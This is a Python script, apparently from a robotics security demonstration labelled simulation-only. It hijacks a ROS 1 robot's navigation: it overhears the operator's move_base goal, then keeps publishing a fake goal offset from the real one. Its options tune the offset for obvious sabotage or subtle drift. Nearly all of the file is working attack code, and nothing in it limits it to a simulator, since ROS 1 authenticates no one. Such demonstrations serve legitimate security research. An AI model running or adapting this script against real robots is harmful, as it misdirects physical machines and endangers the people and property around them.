#!/usr/bin/env python3
"""Simulation-only mission-HIJACK attack: overhear the operator's move_base goal
and inject a fake one, so the robot drives to the ATTACKER's target instead.

  *** SIMULATION-ONLY SECURITY DEMONSTRATION. No real robot is involved. ***

WHAT REAL ATTACKERS DO (and this models)
----------------------------------------
ROS 1 authenticates nobody: any peer that reaches the master can SUBSCRIBE to
read the graph and PUBLISH to any topic. Documented real-world ROS attacks are
exactly this -- rogue publish/subscribe on an exposed or pivoted-into master --
NOT on-the-wire packet sniffing or MITM (those are research artifacts). So this
attack:
  1. SUBSCRIBES to /move_base/goal to OVERHEAR the operator's real target
     (a graph read -- NOT a packet sniff; rospy deserializes it for us), then
  2. PUBLISHES a MoveBaseActionGoal with a target OFFSET from the real one, at a
     steady rate so it stays the newest goal move_base acts on.
The robot then drives to the attacker's point. The operator, having sent its own
goal once, never knows.

TIMING: a subscriber only receives goals published AFTER it subscribes, and the
operator's goal is one-shot. So we subscribe FIRST and WAIT (up to --timeout) for
a real goal before injecting. Run this BEFORE the operator sends its mission.

DETECTABLE: this is a rogue PUBLISH, so `rostopic info /move_base/goal` shows an
extra publisher. That is a true property of what real attackers do; the stealthy
in-flight rewrite (no extra publisher) is on-the-wire MITM -- deliberately NOT
built (academic). See docs/superpowers/specs/2026-08-02-goal-hijack-attack-design.md.

Usage:
    python3 attack_goal.py                       # offset (0, +12), wait <=60s
    python3 attack_goal.py --offset-y 3          # subtle sabotage
    python3 attack_goal.py --offset-x 5 --offset-y 5 --duration 30
"""
import argparse
import csv
import math
import threading
import time

import rospy
from move_base_msgs.msg import MoveBaseActionGoal
from nav_msgs.msg import Odometry


class GoalHijackAttack(object):
    def __init__(self, args):
        self.args = args
        self._lock = threading.Lock()
        self._real_goal = None      # (x, y) overheard from the operator
        self._robot_xy = None       # (x, y) from /odometry/filtered
        self._logged_overheard = False
        self._stop = threading.Event()
        self._start_wall = None

        # Publisher for the injected fake goal.
        self._pub = rospy.Publisher(args.topic, MoveBaseActionGoal, queue_size=1)
        # RECON: subscribe to the SAME topic to overhear the operator's real goal.
        self._goal_sub = rospy.Subscriber(args.topic, MoveBaseActionGoal,
                                          self._on_real_goal, queue_size=1)
        # Robot's actual position, to show the hijack in the CSV.
        rospy.Subscriber("/odometry/filtered", Odometry, self._on_odom,
                         queue_size=1)

        self._csv_file = open(args.csv, "w", newline="")
        self._csv = csv.writer(self._csv_file)
        self._csv.writerow(
            ["elapsed_time", "real_goal_x", "real_goal_y",
             "fake_goal_x", "fake_goal_y", "robot_x", "robot_y"])
        self._csv_file.flush()

    # --- recon / telemetry ---------------------------------------------------
    def _on_real_goal(self, msg):
        """Overhear a goal on the topic. We also receive our OWN injected goals
        here; only the FIRST goal seen is the operator's real one, so we latch it
        once and ignore later messages (which include our injections)."""
        p = msg.goal.target_pose.pose.position
        with self._lock:
            if self._real_goal is None:
                self._real_goal = (p.x, p.y)
                do_log = True
            else:
                do_log = False
        if do_log and not self._logged_overheard:
            self._logged_overheard = True
            rospy.loginfo("OVERHEARD operator goal: (%.2f, %.2f)", p.x, p.y)

    def _on_odom(self, msg):
        with self._lock:
            self._robot_xy = (msg.pose.pose.position.x, msg.pose.pose.position.y)

    # --- the injected message ------------------------------------------------
    def _build_goal(self, fx, fy, real):
        """MoveBaseActionGoal at (fx, fy) in odom, facing from the real goal
        toward the fake one. Yaw-only quaternion computed inline (no tf)."""
        yaw = math.atan2(fy - real[1], fx - real[0])
        g = MoveBaseActionGoal()
        g.header.stamp = rospy.Time.now()
        g.goal.target_pose.header.frame_id = "odom"
        g.goal.target_pose.header.stamp = rospy.Time.now()
        g.goal.target_pose.pose.position.x = fx
        g.goal.target_pose.pose.position.y = fy
        g.goal.target_pose.pose.orientation.z = math.sin(yaw / 2.0)
        g.goal.target_pose.pose.orientation.w = math.cos(yaw / 2.0)
        return g

    def _log_row(self, real, fake):
        with self._lock:
            robot = self._robot_xy
        elapsed = time.time() - self._start_wall
        rx = robot[0] if robot else float("nan")
        ry = robot[1] if robot else float("nan")
        rospy.loginfo("[t=%6.1fs] real=(%.2f,%.2f) fake=(%.2f,%.2f) "
                      "robot=(%.2f,%.2f)", elapsed, real[0], real[1],
                      fake[0], fake[1], rx, ry)
        self._csv.writerow(
            ["%.3f" % elapsed, "%.4f" % real[0], "%.4f" % real[1],
             "%.4f" % fake[0], "%.4f" % fake[1], "%.4f" % rx, "%.4f" % ry])
        self._csv_file.flush()

    # --- main loop -----------------------------------------------------------
    def run(self):
        # Ensure our subscription is actually CONNECTED to a publisher before we rely
        # on catching the operator's one-shot goal. A fresh ROS subscriber's TCP
        # connection takes a moment to establish; without this, the operator's single
        # un-latched goal can be published into a not-yet-connected subscription and
        # missed. (Verified live: a settled subscription catches the one-shot reliably.)
        connect_deadline = time.time() + 10.0
        while not rospy.is_shutdown() and self._goal_sub.get_num_connections() == 0:
            if time.time() > connect_deadline:
                rospy.logwarn("No publisher on %s yet after 10s; proceeding anyway "
                              "(is move_base up?).", self.args.topic)
                break
            time.sleep(0.1)
        rospy.loginfo("Subscription connected (%d publisher(s)). READY — now waiting "
                      "for the operator's goal.", self._goal_sub.get_num_connections())

        # WAIT for the operator's one-shot real goal (bounded by --timeout).
        rospy.loginfo("Lurking: subscribed to %s, waiting up to %.0fs for the "
                      "operator's goal ...", self.args.topic, self.args.timeout)
        deadline = time.time() + self.args.timeout
        while not rospy.is_shutdown():
            with self._lock:
                real = self._real_goal
            if real is not None:
                break
            if time.time() > deadline:
                rospy.logerr("No operator goal seen within %.0fs. Is the "
                             "operator running? (Start this BEFORE the operator "
                             "sends its goal.)", self.args.timeout)
                return 1
            time.sleep(0.05)
        if rospy.is_shutdown():
            return 0

        fake = (real[0] + self.args.offset_x, real[1] + self.args.offset_y)
        rospy.loginfo("INJECTING fake goal: real=(%.2f,%.2f) + offset=(%.2f,%.2f) "
                      "-> fake=(%.2f,%.2f)", real[0], real[1],
                      self.args.offset_x, self.args.offset_y, fake[0], fake[1])

        self._start_wall = time.time()
        rate = rospy.Rate(self.args.rate)
        next_log = self._start_wall + 1.0
        while not self._stop.is_set() and not rospy.is_shutdown():
            if self.args.duration > 0 and \
                    (time.time() - self._start_wall) >= self.args.duration:
                rospy.loginfo("Duration reached -- stopping.")
                break
            self._pub.publish(self._build_goal(fake[0], fake[1], real))
            now = time.time()
            if now >= next_log:
                self._log_row(real, fake)
                next_log += 1.0
            rate.sleep()
        return 0

    def shutdown(self):
        """Idempotent: stop publishing and close the CSV. No corrective goal is
        sent -- we just cease."""
        self._stop.set()
        try:
            if not self._csv_file.closed:
                self._csv_file.flush()
                self._csv_file.close()
        except Exception as exc:  # noqa: BLE001
            rospy.logwarn("Error closing CSV: %s", exc)
        rospy.loginfo("ATTACK STOPPED. CSV saved to %s", self.args.csv)


def parse_args():
    p = argparse.ArgumentParser(
        description="Simulation-only mission-hijack: overhear the operator's "
                    "move_base goal, then inject a fake one (real + offset).")
    p.add_argument("--offset-x", type=float, default=0.0, dest="offset_x",
                   help="x offset added to the overheard real goal (default 0)")
    p.add_argument("--offset-y", type=float, default=12.0, dest="offset_y",
                   help="y offset added to the overheard real goal (default 12 "
                        "= visible sabotage; use a small value for subtle drift)")
    p.add_argument("--rate", type=float, default=2.0,
                   help="publish rate in Hz for the injected goal (default 2)")
    p.add_argument("--duration", type=float, default=0.0,
                   help="seconds to keep injecting; 0 = until Ctrl-C (default 0)")
    p.add_argument("--timeout", type=float, default=60.0,
                   help="max seconds to wait for the operator's goal (default 60)")
    p.add_argument("--topic", default="/move_base/goal",
                   help="goal topic to overhear and inject on "
                        "(default /move_base/goal)")
    p.add_argument("--csv", default="attack_goal_report.csv",
                   help="telemetry CSV path (default attack_goal_report.csv)")
    args = p.parse_args()
    if args.rate <= 0:
        p.error("--rate must be > 0")
    if args.timeout <= 0:
        p.error("--timeout must be > 0")
    return args


def main():
    args = parse_args()
    rospy.init_node("attack_goal", anonymous=True)
    attack = GoalHijackAttack(args)
    rospy.on_shutdown(attack.shutdown)
    try:
        return attack.run()
    except rospy.ROSInterruptException:
        pass
    finally:
        attack.shutdown()


if __name__ == "__main__":
    import sys
    sys.exit(main() or 0)
